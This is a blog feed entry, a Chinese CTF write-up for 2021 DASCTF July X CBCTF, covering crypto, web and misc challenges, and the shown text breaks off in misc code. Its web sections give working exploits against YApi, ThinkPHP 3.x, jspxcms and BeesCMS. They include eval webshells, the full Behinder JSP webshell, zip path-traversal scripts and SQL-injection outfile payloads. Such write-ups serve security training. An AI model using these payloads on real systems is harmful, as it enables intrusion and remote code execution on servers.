&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;Some-type-of-juggling&quot;&gt;&lt;a href=&quot;#Some-typ</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="比赛复现" scheme="https://swhat.github.io/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="https://swhat.github.io/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>2021DASCTF July X CBCTF 4th</title>
    <link href="https://swhat.github.io/2021/08/09/2021DASCTF-July-X-CBCTF-4th/"/>
    <id>https://swhat.github.io/2021/08/09/2021DASCTF-July-X-CBCTF-4th/</id>
    <published>2021-08-09T14:26:42.000Z</published>
    <updated>2021-08-15T04:25:06.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc node<span class="hljs-number">4</span>.buuoj.cn <span class="hljs-number">25870</span>                                                                                                                                                      <span class="hljs-number">1</span> ⨯<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>Try again<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>flag&#123;<span class="hljs-number">30</span>cf<span class="hljs-number">1012</span>-e<span class="hljs-number">303</span><span class="hljs-number">-4</span>caf<span class="hljs-number">-98</span>ba-d<span class="hljs-number">63</span>f<span class="hljs-number">3591e9</span>cd&#125;<br></code></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h4 id="Yapi-Mock-远程命令执行漏洞"><a href="#Yapi-Mock-远程命令执行漏洞" class="headerlink" title="Yapi Mock 远程命令执行漏洞"></a>Yapi Mock 远程命令执行漏洞</h4><p>添加项目—&gt;添加接口—&gt;选择高级Mock—&gt;勾选脚本—&gt;将开启按钮打开—&gt;然后将PoC写在脚本中保存</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> sandbox = <span class="hljs-keyword">this</span><br><span class="hljs-keyword">const</span> ObjectConstructor = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> FunctionConstructor = ObjectConstructor.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> myfun = FunctionConstructor(<span class="hljs-string">&#x27;return process&#x27;</span>)<br><span class="hljs-keyword">const</span> process = myfun()<br>mockJson = process.mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;ls /&amp; cat /ffffffflllllaggggg&quot;</span>).toString()<br></code></pre></td></tr></table></figure><p>访问预览地址，回显命令执行结果getflag</p><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h2><h4 id="非ascii字符绕过escapeshellarg"><a href="#非ascii字符绕过escapeshellarg" class="headerlink" title="非ascii字符绕过escapeshellarg"></a>非ascii字符绕过escapeshellarg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))<br>    &#123;<br>        <span class="hljs-variable">$cmd</span> = escapeshellarg(<span class="hljs-variable">$cmd</span>);<br>        system(<span class="hljs-string">&#x27;cat &#x27;</span> . <span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>hint提示管理员曾访问过flag，查看日志</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?cmd=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><p>得到flag文件为/this_is_final_flag_e2a457126032b42d.php</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">?cmd=<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_f</span>inal<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span>e<span class="hljs-number">2</span>a<span class="hljs-number">457126032</span>b<span class="hljs-number">42</span>d.php<br></code></pre></td></tr></table></figure><p>过滤了flag关键字，配合escapeshellarg函数绕过：<a href="https://www.php.net/manual/zh/function.escapeshellarg.php">https://www.php.net/manual/zh/function.escapeshellarg.php</a></p><p>当escapeshellarg（）从UTF-8字符串中剥离非ASCII字符时，添加以下内容修复了该问题：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;?php<br>setlocale(LC_CTYPE, <span class="hljs-string">&quot;en_US.UTF-8&quot;</span>);<br>?&gt;<br>  <br> Under Windows, this function puts <span class="hljs-built_in">string</span> <span class="hljs-keyword">into</span> double-quotes, <span class="hljs-keyword">not</span> single, <span class="hljs-keyword">and</span> replaces %(percent sign) <span class="hljs-keyword">with</span> a <span class="hljs-literal">space</span>, <span class="hljs-keyword">that</span>&#x27;s why <span class="hljs-keyword">it</span>&#x27;s impossible <span class="hljs-keyword">to</span> pass a filename <span class="hljs-keyword">with</span> percents <span class="hljs-keyword">in</span> <span class="hljs-keyword">its</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">through</span> this function.<br> <br>在Windows下，此函数将字符串放在双引号中，而不是单引号中，并用空格替换%（百分号），这就是为什么无法通过此函数传递名称中带有百分数的文件名的原因。<br></code></pre></td></tr></table></figure><p>在flag字符之间添加一个非ascii字符，然后unicode绕一下flag正则</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">?cmd=this_is_final_fl%faag_e2a457126032b42d.php</span><br><span class="xml"> #</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;flag&#123;cb3043a6-bfe6-4c6d-a75e-fc77e27de779&#125;&#x27;</span>; <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h2><h4 id="ThinkPHP-3-x-日志包含RCE-getshell"><a href="#ThinkPHP-3-x-日志包含RCE-getshell" class="headerlink" title="ThinkPHP 3.x 日志包含RCE getshell"></a>ThinkPHP 3.x 日志包含RCE getshell</h4><p>TP3.2.3日志漏洞:<a href="https://www.thinkphp.cn/topic/58651.html">https://www.thinkphp.cn/topic/58651.html</a></p><p>ThinkPHP3.2.x RCE漏洞通报：<a href="https://cloud.tencent.com/developer/article/1855060">https://cloud.tencent.com/developer/article/1855060</a></p><p>通过输入http://域名/应用名（默认为Application，很多开发者不会改它）/Runtime/Logs/组名（默认为Home或者Index，很多开发者不会改它）/18_08_15.log的方式即可访问日志文件</p><p>POC</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">写入phpinfo()<br>GET <span class="hljs-regexp">/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/</span><span class="hljs-number">1.1</span><br>Host: c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90.0</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>webp,*/*;q=<span class="hljs-number">0.8</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=<span class="hljs-number">3</span>nctjnqfd39jl28bg59mnaf2b5<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br><br>  <br>查看日志，注意日志时间<br>GET <span class="hljs-regexp">/index.php/</span>?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=.<span class="hljs-regexp">/Application/</span>Runtime<span class="hljs-regexp">/Logs/</span>Common/<span class="hljs-number">21</span>_08_02.log<br><br>上shell<br>GET /index.php?m=--&gt;&lt;?=@eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;atkx&quot;</span>]);?&gt;<br><br>蚁剑连接：<br>http:<span class="hljs-regexp">//</span>c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<span class="hljs-regexp">/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Common/</span><span class="hljs-number">21</span>_08_02.log<br>pass：atkx<br></code></pre></td></tr></table></figure><p>蚁剑连接成功</p><p>ThinkphpGUI工具getshell</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/121016-717857.png" alt="image-20210815121015293"></p><p>相关信息;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">检测漏洞 ThinkPHP <span class="hljs-number">3</span>.x Log RCE中......<br>[+] 存在ThinkPHP <span class="hljs-number">3</span>.x Log RCE<br>Payload: http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log<br>[+] http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log   Pass:peiqi<br></code></pre></td></tr></table></figure><p>蚁剑连接成功</p><h2 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h2><h4 id="jspxcms解压getshell漏洞"><a href="#jspxcms解压getshell漏洞" class="headerlink" title="jspxcms解压getshell漏洞"></a>jspxcms解压getshell漏洞</h4><p><a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/</a></p><p>admin空密码登录后台，进入后台管理页面：/cmscp/index.do找到漏洞存在的功能页面。</p><p>这里用冰蝎自带的马shell.jsp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> U extends ClassLoader&#123;<span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span>&#123;super(c);&#125;public Class g(byte <span class="hljs-literal">[]</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure><p>生成war，把shell.jsp和jar.exe放至同一目录下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>cf <span class="hljs-keyword">shell.war </span>*<br></code></pre></td></tr></table></figure><p>所以选择脚本写入</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import zipfile<br><br>z = zipfile.ZipFile(<span class="hljs-string">&#x27;test.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    temp=f.<span class="hljs-built_in">read</span>()<br><br>z.writestr(<span class="hljs-string">&#x27;../../../shell.war&#x27;</span>,temp)  <span class="hljs-comment">#shell.war为上一步生产的后门war包</span><br>z.<span class="hljs-built_in">close</span>()<br>    <br>      <br>      <br>import zipfile<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cmd.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>binary=f.<span class="hljs-built_in">read</span>()<br>f.<span class="hljs-built_in">close</span>()<br>binary1 = b<span class="hljs-string">&#x27;123123&#x27;</span><br>zipFile = zipfile.ZipFile(<span class="hljs-string">&quot;tests.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)<br>info = zipfile.ZipInfo(<span class="hljs-string">&quot;tests.zip&quot;</span>)<br>zipFile.writestr(<span class="hljs-string">&quot;../../../shells.war&quot;</span>, binary)<br>zipFile.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p>上传生成的test.zip</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122132-465323.png" alt="image-20210815122131241"></p><p>注意解压，然后冰蝎连接</p><p><a href="http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/cmscp/index.do">http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/</a>shell/shell.jsp</p><p>pass：rebeyond</p><h2 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h2><h4 id="Beescms-v4-0-sql注入漏洞分析"><a href="#Beescms-v4-0-sql注入漏洞分析" class="headerlink" title="Beescms_v4.0 sql注入漏洞分析"></a>Beescms_v4.0 sql注入漏洞分析</h4><p>后台注入outfile :<a href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p><p>/<a href="http://www.zip/">www.zip</a> 下载源码是beescms，/var/www/html/</p><p>sql注入outfile写webshell，过滤了空格，用然/**/代替，后连接webshell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /admin/login.php?action=ck_login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">90</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">215</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn/admin/login.php<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=om<span class="hljs-number">10447</span>imss<span class="hljs-number">7</span>jbttdpjm<span class="hljs-number">5</span>lsf<span class="hljs-number">24</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">user</span>=admin&#x27;/**/union/**/selselectect/**/<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">3</span>f<span class="hljs-number">3</span>d<span class="hljs-number">406576616</span>c<span class="hljs-number">28245</span>f<span class="hljs-number">504</span>f<span class="hljs-number">53545</span>b<span class="hljs-number">2761746</span>b<span class="hljs-number">78275</span>d<span class="hljs-number">293</span>f<span class="hljs-number">3</span>e,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>/**/into/**/outoutfilefile/**/&#x27;/var/www/html/atkx.php&#x27;#&amp;password=<span class="hljs-number">123456</span>&amp;code=&amp;submit=true&amp;submit.x=<span class="hljs-number">47</span>&amp;submit.y=-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>蚁剑连接成功getflag </p><h2 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h2><p>00截断</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /qbl.php?id=<span class="hljs-number">1</span>.php%<span class="hljs-number">0012312312321321</span>&amp;url=http://baidu.com HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">15</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: https://hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span>/sc.php?id=<span class="hljs-number">12312312321321</span>&amp;url=http://baidu.com<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">86</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">img</span>=data%<span class="hljs-number">3</span>Aimage%<span class="hljs-number">2</span>Fpng%<span class="hljs-number">3</span>Bbase<span class="hljs-number">64</span>%<span class="hljs-number">2</span>CR<span class="hljs-number">0</span>lGODk<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocApwaHBpbmZvKCk<span class="hljs-number">7</span>CkBldmFsKCRfUE<span class="hljs-number">9</span>TVFsxXSk<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs maxima">┌──(kali㉿kali)-[~/桌面]<br>└─$ zsteg -E <span class="hljs-string">&quot;b1,g,lsb,xy&quot;</span> ezSteganography-flag.png &gt; out.png<br><br><br><br>First <span class="hljs-built_in">part</span> of flag <span class="hljs-built_in">is</span>:flag&#123;2e9ec6480d0515<br>QIM quantization <span class="hljs-built_in">is</span> useful to <span class="hljs-built_in">get</span> another flag.<span class="hljs-keyword">step</span> <span class="hljs-built_in">is</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>QIM量化</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> <span class="hljs-type">Image</span><br><span class="hljs-keyword">from</span> <span class="hljs-type">Crypto</span>.<span class="hljs-type">Util</span> <span class="hljs-keyword">import</span> number<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>def extract(delta,y):<br><span class="hljs-keyword">out</span>=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (delta/<span class="hljs-number">2</span>-y%delta):<br><span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">0</span>:<br><span class="hljs-keyword">out</span>.append(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">out</span>.append(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">out</span>=np.<span class="hljs-built_in">array</span>(<span class="hljs-keyword">out</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span><br><br>p=np.<span class="hljs-built_in">array</span>(<span 